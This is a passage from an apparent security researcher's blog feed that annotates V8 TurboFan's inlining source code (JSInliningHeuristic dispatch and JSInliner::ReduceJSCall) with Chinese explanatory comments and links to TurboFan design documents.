calls[kMaxCallPolymorphism + 1];</span><br><span class="line">  Node* if_successes[kMaxCallPolymorphism];</span><br><span class="line">  Node* callee = NodeProperties::GetValueInput(node, 0);</span><br><span class="line"></span><br><span class="line">  // Setup the inputs for the cloned call nodes.</span><br><span class="line">  int const input_count = node-&gt;InputCount();</span><br><span class="line">  Node** inputs = graph()-&gt;zone()-&gt;NewArray&lt;Node*&gt;(input_count);</span><br><span class="line">  for (int i = 0; i &lt; input_count; ++i) &#123;</span><br><span class="line">    inputs[i] = node-&gt;InputAt(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // CreateOrReuseDispatch内包含了Graph中对多个 branch 的 Control,effect,value</span><br><span class="line">  // 的整理,旨在彻底消除 merge，为每个 branch 建立单独的内联依赖</span><br><span class="line">  // 包括平行复制 FrameState 和 Call。</span><br><span class="line">  // 这里注意，由于分离 merge 前的 FrameState 内存放了 bci 以及 value，value来源于</span><br><span class="line">  // phi，而且在 deopt 的时候两个 branch 对应的 bci 应该相同，因此重新分别链接多个</span><br><span class="line">  // branch 的时候只需要重新选择 FrameState 插槽的 value。</span><br><span class="line">  // Create the appropriate control flow to dispatch to the cloned calls.</span><br><span class="line">  CreateOrReuseDispatch(node, callee, candidate, if_successes, calls, inputs,</span><br><span class="line">                        input_count);</span><br><span class="line"></span><br><span class="line">  // Check if we have an exception projection for the call &#123;node&#125;.</span><br><span class="line">  Node* if_exception = nullptr;</span><br><span class="line">  if (NodeProperties::IsExceptionalCall(node, &amp;if_exception)) &#123;</span><br><span class="line">    Node* if_exceptions[kMaxCallPolymorphism + 1];</span><br><span class="line">    for (int i = 0; i &lt; num_calls; ++i) &#123;</span><br><span class="line">      if_successes[i] = graph()-&gt;NewNode(common()-&gt;IfSuccess(), calls[i]);</span><br><span class="line">      if_exceptions[i] =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;IfException(), calls[i], calls[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Morph the &#123;if_exception&#125; projection into a join.</span><br><span class="line">    Node* exception_control =</span><br><span class="line">        graph()-&gt;NewNode(common()-&gt;Merge(num_calls), num_calls, if_exceptions);</span><br><span class="line">    if_exceptions[num_calls] = exception_control;</span><br><span class="line">    Node* exception_effect = graph()-&gt;NewNode(common()-&gt;EffectPhi(num_calls),</span><br><span class="line">                                              num_calls + 1, if_exceptions);</span><br><span class="line">    Node* exception_value = graph()-&gt;NewNode(</span><br><span class="line">        common()-&gt;Phi(MachineRepresentation::kTagged, num_calls), num_calls + 1,</span><br><span class="line">        if_exceptions);</span><br><span class="line">    ReplaceWithValue(if_exception, exception_value, exception_effect,</span><br><span class="line">                     exception_control);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Morph the original call site into a join of the dispatched call sites.</span><br><span class="line">  Node* control =</span><br><span class="line">      graph()-&gt;NewNode(common()-&gt;Merge(num_calls), num_calls, if_successes);</span><br><span class="line">  calls[num_calls] = control;</span><br><span class="line">  Node* effect =</span><br><span class="line">      graph()-&gt;NewNode(common()-&gt;EffectPhi(num_calls), num_calls + 1, calls);</span><br><span class="line">  Node* value =</span><br><span class="line">      graph()-&gt;NewNode(common()-&gt;Phi(MachineRepresentation::kTagged, num_calls),</span><br><span class="line">                       num_calls + 1, calls);</span><br><span class="line">  ReplaceWithValue(node, value, effect, control);</span><br><span class="line"></span><br><span class="line">  // Inline the individual, cloned call sites.</span><br><span class="line">  for (int i = 0; i &lt; num_calls; ++i) &#123;</span><br><span class="line">    Node* node = calls[i];</span><br><span class="line">    if (candidate.can_inline_function[i] &amp;&amp;</span><br><span class="line">        (small_function ||</span><br><span class="line">         cumulative_count_ &lt; FLAG_max_inlined_bytecode_size_cumulative)) &#123;</span><br><span class="line">         </span><br><span class="line">      // 针对每个call均进行ReduceJSCall</span><br><span class="line">      Reduction const reduction = inliner_.ReduceJSCall(node);</span><br><span class="line">      if (reduction.Changed()) &#123;</span><br><span class="line">        // Killing the call node is not strictly necessary, but it is safer to</span><br><span class="line">        // make sure we do not resurrect the node.</span><br><span class="line">        node-&gt;Kill();</span><br><span class="line">        // Small functions don&apos;t count towards the budget.</span><br><span class="line">        if (!small_function) &#123;</span><br><span class="line">          cumulative_count_ += candidate.bytecode[i]-&gt;length();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return Replace(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="jsinlinerreducejscall">JSInliner::ReduceJSCall</span></h3><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190704025018.png" alt><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line">// js-inlining.cc:363 </span><br><span class="line"></span><br><span class="line">Reduction JSInliner::ReduceJSCall(Node* node) &#123;</span><br><span class="line">  DCHECK(IrOpcode::IsInlineeOpcode(node-&gt;opcode()));</span><br><span class="line">  JSCallAccessor call(node);</span><br><span class="line"></span><br><span class="line">  // Determine the call target.</span><br><span class="line">  base::Optional&lt;SharedFunctionInfoRef&gt; shared_info(DetermineCallTarget(node));</span><br><span class="line">  if (!shared_info.has_value()) return NoChange();</span><br><span class="line"></span><br><span class="line">  DCHECK(shared_info-&gt;IsInlineable());</span><br><span class="line"></span><br><span class="line">  // Constructor must be constructable.</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kJSConstruct &amp;&amp;</span><br><span class="line">      !IsConstructable(shared_info-&gt;kind())) &#123;</span><br><span class="line">    TRACE(&quot;Not inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info()</span><br><span class="line">                          &lt;&lt; &quot; because constructor is not constructable.&quot;);</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Inline node 必须是 kJSCall 或 IsClassConstructor</span><br><span class="line">  // Class constructors are callable, but [[Call]] will raise an exception.</span><br><span class="line">  // See ES6 section 9.2.1 [[Call]] ( thisArgument, argumentsList ).</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kJSCall &amp;&amp;</span><br><span class="line">      IsClassConstructor(shared_info-&gt;kind())) &#123;</span><br><span class="line">    TRACE(&quot;Not inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info()</span><br><span class="line">                          &lt;&lt; &quot; because callee is a class constructor.&quot;);</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // To ensure inlining always terminates, we have an upper limit on inlining</span><br><span class="line">  // the nested calls.</span><br><span class="line">  int nesting_level = 0;</span><br><span class="line">  for (Node* frame_state = call.frame_state();</span><br><span class="line">       frame_state-&gt;opcode() == IrOpcode::kFrameState;</span><br><span class="line">       frame_state = frame_state-&gt;InputAt(kFrameStateOuterStateInput)) &#123;</span><br><span class="line">    nesting_level++;</span><br><span class="line">    if (nesting_level &gt; kMaxDepthForInlining) &#123;</span><br><span class="line">      TRACE(&quot;Not inlining &quot;</span><br><span class="line">            &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info()</span><br><span class="line">            &lt;&lt; &quot; because call has exceeded the maximum depth for function &quot;</span><br><span class="line">               &quot;inlining.&quot;);</span><br><span class="line">      return NoChange();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* exception_target = nullptr;</span><br><span class="line">  NodeProperties::IsExceptionalCall(node, &amp;exception_target);</span><br><span class="line"></span><br><span class="line">  // JSInliningHeuristic has already filtered candidates without a</span><br><span class="line">  // BytecodeArray by calling SharedFunctionInfoRef::IsInlineable. For the ones</span><br><span class="line">  // passing the IsInlineable check, The broker holds a reference to the</span><br><span class="line">  // bytecode array, which prevents it from getting flushed.</span><br><span class="line">  // Therefore, the following check should always hold true.</span><br><span class="line">  CHECK(shared_info.value().is_compiled());</span><br><span class="line"></span><br><span class="line">  if (!FLAG_concurrent_inlining &amp;&amp; info_-&gt;is_source_positions_enabled()) &#123;</span><br><span class="line">    SharedFunctionInfo::EnsureSourcePositionsAvailable(isolate(),</span><br><span class="line">                                                       shared_info-&gt;object());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TRACE(&quot;Inlining &quot; &lt;&lt; *shared_info &lt;&lt; &quot; into &quot; &lt;&lt; info_-&gt;shared_info()</span><br><span class="line">                    &lt;&lt; ((exception_target != nullptr) ? &quot; (inside try-block)&quot;</span><br><span class="line">                                                      : &quot;&quot;));</span><br><span class="line">  // Determine the targets feedback vector and its context.</span><br><span class="line">  Node* context;</span><br><span class="line">  FeedbackVectorRef feedback_vector = DetermineCallContext(node, context);</span><br><span class="line"></span><br><span class="line">  if (FLAG_concurrent_inlining) &#123;</span><br><span class="line">    if (!shared_info.value().IsSerializedForCompilation(feedback_vector)) &#123;</span><br><span class="line">      TRACE(&quot;Missed opportunity to inline a function (&quot;</span><br><span class="line">            &lt;&lt; *shared_info &lt;&lt; &quot; with &quot; &lt;&lt; feedback_vector &lt;&lt; &quot;)&quot;);</span><br><span class="line">      return NoChange();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // [+] 现在开始真正的inlining工作</span><br><span class="line">  // ----------------------------------------------------------------</span><br><span class="line">  // After this point, we&apos;ve made a decision to inline this function.</span><br><span class="line">  // We shall not bailout from inlining if we got here.</span><br><span class="line"></span><br><span class="line">  BytecodeArrayRef bytecode_array = shared_info.value().GetBytecodeArray();</span><br><span class="line"></span><br><span class="line">  // Remember that we inlined this function.</span><br><span class="line">  int inlining_id = info_-&gt;AddInlinedFunction(</span><br><span class="line">      shared_info.value().object(), bytecode_array.object(),</span><br><span class="line">      source_positions_-&gt;GetSourcePosition(node));</span><br><span class="line"></span><br><span class="line">  // 建立子图</span><br><span class="line">  // Create the subgraph for the inlinee.</span><br><span class="line">  Node* start;</span><br><span class="line">  Node* end;</span><br><span class="line">  &#123;</span><br><span class="line">    // Run the BytecodeGraphBuilder to create the subgraph.</span><br><span class="line">    Graph::SubgraphScope scope(graph());</span><br><span class="line">    BytecodeGraphBuilderFlags flags(</span><br><span class="line">        BytecodeGraphBuilderFlag::kSkipFirstStackCheck);</span><br><span class="line">    if (info_-&gt;is_analyze_environment_liveness()) &#123;</span><br><span class="line">      flags |= BytecodeGraphBuilderFlag::kAnalyzeEnvironmentLiveness;</span><br><span class="line">    &#125;</span><br><span class="line">    if (info_-&gt;is_bailout_on_uninitialized()) &#123;</span><br><span class="line">      flags |= BytecodeGraphBuilderFlag::kBailoutOnUninitialized;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">      // TODO(mslekova): Remove the following once bytecode graph builder</span><br><span class="line">      // is brokerized. Also, remove the context argument from</span><br><span class="line">      // BuildGraphFromBytecode and extract it from the broker there.</span><br><span class="line">      AllowHandleDereference allow_handle_deref;</span><br><span class="line">      AllowHandleAllocation allow_handle_alloc;</span><br><span class="line">      AllowHeapAllocation allow_heap_alloc;</span><br><span class="line">      AllowCodeDependencyChange allow_code_dep_change;</span><br><span class="line">      CallFrequency frequency = call.frequency();</span><br><span class="line">      Handle&lt;Context&gt; native_context =</span><br><span class="line">          handle(info_-&gt;native_context(), isolate());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      // ----------------------------------------------------------------</span><br><span class="line">      // BuildGraph！</span><br><span class="line">      // ----------------------------------------------------------------</span><br><span class="line">      BuildGraphFromBytecode(broker(), zone(), bytecode_array.object(),</span><br><span class="line">                             shared_info.value().object(),</span><br><span class="line">                             feedback_vector.object(), BailoutId::None(),</span><br><span class="line">                             jsgraph(), frequency, source_positions_,</span><br><span class="line">                             native_context, inlining_id, flags);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Extract the inlinee start/end nodes.</span><br><span class="line">    start = graph()-&gt;start();</span><br><span class="line">    end = graph()-&gt;end();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // If we are inlining into a surrounding exception handler, we collect all</span><br><span class="line">  // potentially throwing nodes within the inlinee that are not handled locally</span><br><span class="line">  // by the inlinee itself. They are later wired into the surrounding handler.</span><br><span class="line">  NodeVector uncaught_subcalls(local_zone_);</span><br><span class="line">  if (exception_target != nullptr) &#123;</span><br><span class="line">    // Find all uncaught &apos;calls&apos; in the inlinee.</span><br><span class="line">    AllNodes inlined_nodes(local_zone_, end, graph());</span><br><span class="line">    for (Node* subnode : inlined_nodes.reachable) &#123;</span><br><span class="line">      // Every possibly throwing node should get &#123;IfSuccess&#125; and &#123;IfException&#125;</span><br><span class="line">      // projections, unless there already is local exception handling.</span><br><span class="line">      if (subnode-&gt;op()-&gt;HasProperty(Operator::kNoThrow)) continue;</span><br><span class="line">      if (!NodeProperties::IsExceptionalCall(subnode)) &#123;</span><br><span class="line">        DCHECK_EQ(2, subnode-&gt;op()-&gt;ControlOutputCount());</span><br><span class="line">        uncaught_subcalls.push_back(subnode);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* frame_state = call.frame_state();</span><br><span class="line">  Node* new_target = jsgraph()-&gt;UndefinedConstant();</span><br><span class="line"></span><br><span class="line">  // Inline &#123;JSConstruct&#125; requires some additional magic.</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kJSConstruct) &#123;</span><br><span class="line">    // Swizzle the inputs of the &#123;JSConstruct&#125; node to look like inputs to a</span><br><span class="line">    // normal &#123;JSCall&#125; node so that the rest of the inlining machinery</span><br><span class="line">    // behaves as if we were dealing with a regular function invocation.</span><br><span class="line">    new_target = call.new_target();  // Retrieve new target value input.</span><br><span class="line">    node-&gt;RemoveInput(call.formal_arguments() + 1);  // Drop new target.</span><br><span class="line">    node-&gt;InsertInput(graph()-&gt;zone(), 1, new_target);</span><br><span class="line"></span><br><span class="line">    // Insert nodes around the call that model the behavior required for a</span><br><span class="line">    // constructor dispatch (allocate implicit receiver and check return value).</span><br><span class="line">    // This models the behavior usually accomplished by our &#123;JSConstructStub&#125;.</span><br><span class="line">    // Note that the context has to be the callers context (input to call node).</span><br><span class="line">    // Also note that by splitting off the &#123;JSCreate&#125; piece of the constructor</span><br><span class="line">    // call, we create an observable deoptimization point after the receiver</span><br><span class="line">    // instantiation but before the invocation (i.e. inside &#123;JSConstructStub&#125;</span><br><span class="line">    // where execution continues at &#123;construct_stub_create_deopt_pc_offset&#125;).</span><br><span class="line">    Node* receiver = jsgraph()-&gt;TheHoleConstant();  // Implicit receiver.</span><br><span class="line">    Node* context = NodeProperties::GetContextInput(node);</span><br><span class="line">    if (NeedsImplicitReceiver(shared_info.value())) &#123;</span><br><span class="line">      Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">      Node* control = NodeProperties::GetControlInput(node);</span><br><span class="line">      Node* frame_state_inside = CreateArtificialFrameState(</span><br><span class="line">          node, frame_state, call.formal_arguments(),</span><br><span class="line">          BailoutId::ConstructStubCreate(), FrameStateType::kConstructStub,</span><br><span class="line">          shared_info.value(), context);</span><br><span class="line">      Node* create =</span><br><span class="line">          graph()-&gt;NewNode(javascript()-&gt;Create(), call.target(), new_target,</span><br><span class="line">                           context, frame_state_inside, effect, control);</span><br><span class="line">      uncaught_subcalls.push_back(create);  // Adds &#123;IfSuccess&#125; &amp; &#123;IfException&#125;.</span><br><span class="line">      NodeProperties::ReplaceControlInput(node, create);</span><br><span class="line">      NodeProperties::ReplaceEffectInput(node, create);</span><br><span class="line">      // Placeholder to hold &#123;node&#125;&apos;s value dependencies while &#123;node&#125; is</span><br><span class="line">      // replaced.</span><br><span class="line">      Node* dummy = graph()-&gt;NewNode(common()-&gt;Dead());</span><br><span class="line">      NodeProperties::ReplaceUses(node, dummy, node, node, node);</span><br><span class="line">      Node* result;</span><br><span class="line">      // Insert a check of the return value to determine whether the return</span><br><span class="line">      // value or the implicit receiver should be selected as a result of the</span><br><span class="line">      // call.</span><br><span class="line">      Node* check = graph()-&gt;NewNode(simplified()-&gt;ObjectIsReceiver(), node);</span><br><span class="line">      result =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;Select(MachineRepresentation::kTagged),</span><br><span class="line">                           check, node, create);</span><br><span class="line">      receiver = create;  // The implicit receiver.</span><br><span class="line">      ReplaceWithValue(dummy, result);</span><br><span class="line">    &#125; else if (IsDerivedConstructor(shared_info-&gt;kind())) &#123;</span><br><span class="line">      Node* node_success =</span><br><span class="line">          NodeProperties::FindSuccessfulControlProjection(node);</span><br><span class="line">      Node* is_receiver =</span><br><span class="line">          graph()-&gt;NewNode(simplified()-&gt;ObjectIsReceiver(), node);</span><br><span class="line">      Node* branch_is_receiver =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;Branch(), is_receiver, node_success);</span><br><span class="line">      Node* branch_is_receiver_true =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;IfTrue(), branch_is_receiver);</span><br><span class="line">      Node* branch_is_receiver_false =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;IfFalse(), branch_is_receiver);</span><br><span class="line">      branch_is_receiver_false =</span><br><span class="line">          graph()-&gt;NewNode(javascript()-&gt;CallRuntime(</span><br><span class="line">                               Runtime::kThrowConstructorReturnedNonObject),</span><br><span class="line">                           context, NodeProperties::GetFrameStateInput(node),</span><br><span class="line">                           node, branch_is_receiver_false);</span><br><span class="line">      uncaught_subcalls.push_back(branch_is_receiver_false);</span><br><span class="line">      branch_is_receiver_false =</span><br><span class="line">          graph()-&gt;NewNode(common()-&gt;Throw(), branch_is_receiver_false,</span><br><span class="line">                           branch_is_receiver_false);</span><br><span class="line">      NodeProperties::MergeControlToEnd(graph(), common(),</span><br><span class="line">                                        branch_is_receiver_false);</span><br><span class="line"></span><br><span class="line">      ReplaceWithValue(node_success, node_success, node_success,</span><br><span class="line">                       branch_is_receiver_true);</span><br><span class="line">      // Fix input destroyed by the above &#123;ReplaceWithValue&#125; call.</span><br><span class="line">      NodeProperties::ReplaceControlInput(branch_is_receiver, node_success, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;ReplaceInput(1, receiver);</span><br><span class="line">    // Insert a construct stub frame into the chain of frame states. This will</span><br><span class="line">    // reconstruct the proper frame when deoptimizing within the constructor.</span><br><span class="line">    frame_state = CreateArtificialFrameState(</span><br><span class="line">        node, frame_state, call.formal_arguments(),</span><br><span class="line">        BailoutId::ConstructStubInvoke(), FrameStateType::kConstructStub,</span><br><span class="line">        shared_info.value(), context);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Insert a JSConvertReceiver node for sloppy callees. Note that the context</span><br><span class="line">  // passed into this node has to be the callees context (loaded above).</span><br><span class="line">  if (node-&gt;opcode() == IrOpcode::kJSCall &amp;&amp;</span><br><span class="line">      is_sloppy(shared_info-&gt;language_mode()) &amp;&amp; !shared_info-&gt;native()) &#123;</span><br><span class="line">    Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">    if (NodeProperties::CanBePrimitive(broker(), call.receiver(), effect)) &#123;</span><br><span class="line">      CallParameters const&amp; p = CallParametersOf(node-&gt;op());</span><br><span class="line">      Node* global_proxy =</span><br><span class="line">          jsgraph()-&gt;Constant(broker()-&gt;native_context().global_proxy_object());</span><br><span class="line">      Node* receiver = effect =</span><br><span class="line">          graph()-&gt;NewNode(simplified()-&gt;ConvertReceiver(p.convert_mode()),</span><br><span class="line">                           call.receiver(), global_proxy, effect, start);</span><br><span class="line">      NodeProperties::ReplaceValueInput(node, receiver, 1);</span><br><span class="line">      NodeProperties::ReplaceEffectInput(node, effect);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Insert argument adaptor frame if required. The callees formal parameter</span><br><span class="line">  // count (i.e. value outputs of start node minus target, receiver, new target,</span><br><span class="line">  // arguments count and context) have to match the number of arguments passed</span><br><span class="line">  // to the call.</span><br><span class="line">  int parameter_count = shared_info-&gt;internal_formal_parameter_count();</span><br><span class="line">  DCHECK_EQ(parameter_count, start-&gt;op()-&gt;ValueOutputCount() - 5);</span><br><span class="line">  if (call.formal_arguments() != parameter_count) &#123;</span><br><span class="line">    frame_state = CreateArtificialFrameState(</span><br><span class="line">        node, frame_state, call.formal_arguments(), BailoutId::None(),</span><br><span class="line">        FrameStateType::kArgumentsAdaptor, shared_info.value());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return InlineCall(node, new_target, context, frame_state, start, end,</span><br><span class="line">                    exception_target, uncaught_subcalls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2><span id="reference">Reference</span></h2><p>【+】<a href="https://docs.google.com/document/d/1l-oZOW3uU4kSAHccaMuUMl_RCwuQC526s0hcNVeAM1E" target="_blank" rel="noopener">TurboFan Inlining</a></p><p>【+】<a href="https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8" target="_blank" rel="noopener">TurboFan Inlining Heuristics</a></p><h2><span id="todo">TODO</span></h2><ul><li style="list-style: none"><input type="checkbox"> Builtin Inline 的源码分析</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Analsis-of-Turbofan-ReduceNode-amp-amp-Inline&quot;&gt;&lt;a href=&quot;#Intro-Analsis-of-Turbofan-ReduceNode-amp-amp-Inline&quot; class=&quot;headerlink&quot; title=&quot;Intro: Analsis of Turbofan ReduceNode &amp;amp;&amp;amp; Inline&quot;&gt;&lt;/a&gt;Intro: Analsis of Turbofan ReduceNode &amp;amp;&amp;amp; Inline&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/"/>
    
      <category term="optimize" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/optimize/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="optimize" scheme="http://p1umer.gituhb.io/tags/optimize/"/>
    
  </entry>
  
  <entry>
    <title>V8 Optimize: FrameState</title>
    <link href="http://p1umer.gituhb.io/2019/07/03/V8-Optimize-FrameState/"/>
    <id>http://p1umer.gituhb.io/2019/07/03/V8-Optimize-FrameState/</id>
    <published>2019-07-02T19:48:19.000Z</published>
    <updated>2019-07-04T15:57:00.875Z</updated>
    
